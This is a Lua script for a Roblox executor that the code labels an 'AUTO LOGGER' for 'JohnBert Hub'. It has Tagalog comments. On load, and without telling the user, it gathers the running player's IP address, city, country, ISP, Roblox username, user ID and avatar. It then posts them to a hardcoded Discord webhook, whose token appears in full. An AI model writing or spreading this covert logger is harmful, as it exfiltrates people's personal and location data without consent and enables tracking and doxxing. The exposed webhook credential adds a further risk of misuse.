-- ================= AUTO LOGGER (WEBHOOK WITH IP & AVATAR) =================
local WebhookURL = "https://discord.com/api/webhooks/1552664878903205939/nIhoJl-yZrKzYol8kBwMzhKCt-fYlcfLr6AehmafF8_HRVPKvrUCZ-6B3SykbUD05TAv"

local function SendLog()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local HttpService = game:GetService("HttpService")
    
    -- Kunin ang IP at Location details gamit ang IP API
    local ipSuccess, ipData = pcall(function()
        local response = game:HttpGet("http://ip-api.com/json/")
        return HttpService:JSONDecode(response)
    end)
    
    local ip = ipSuccess and ipData.query or "Unknown"
    local country = ipSuccess and ipData.country or "Unknown"
    local city = ipSuccess and ipData.city or "Unknown"
    local isp = ipSuccess and ipData.isp or "Unknown"

    -- Kunin ang Avatar Headshot Thumbnail ng player
    local thumbSuccess, thumbUrl = pcall(function()
        local content = game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. LocalPlayer.UserId .. "&size=420x420&format=Png&isCircular=false")
        local data = HttpService:JSONDecode(content)
        return data.data[1].imageUrl
    end)
    
    local avatarImage = thumbSuccess and thumbUrl or ""

    local data = {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "🚀 May Nag-execute ng JohnBert Hub!",
            ["color"] = 65280, -- Green color
            ["fields"] = {
                {["name"] = "👤 Username:", ["value"] = LocalPlayer.Name, ["inline"] = true},
                {["name"] = "📛 Display Name:", ["value"] = LocalPlayer.DisplayName, ["inline"] = true},
                {["name"] = "🆔 User ID:", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true},
                {["name"] = "🎮 Game ID:", ["value"] = tostring(game.PlaceId), ["inline"] = true},
                {["name"] = "🌍 IP Address:", ["value"] = ip, ["inline"] = true},
                {["name"] = "📍 Location:", ["value"] = city .. ", " .. country, ["inline"] = true},
                {["name"] = "🔌 ISP / Network:", ["value"] = isp, ["inline"] = false},
            },
            ["thumbnail"] = {
                ["url"] = avatarImage
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    local success = pcall(function()
        local json = HttpService:JSONEncode(data)
        if syn and syn.request then
            syn.request({Url = WebhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json})
        elseif http_request then
            http_request({Url = WebhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json})
        elseif request then
            request({Url = WebhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json})
        elseif http and http.request then
            http.request({Url = WebhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json})
        end
    end)
end

-- I-run ang log kapag na-load ang script
pcall(SendLog)

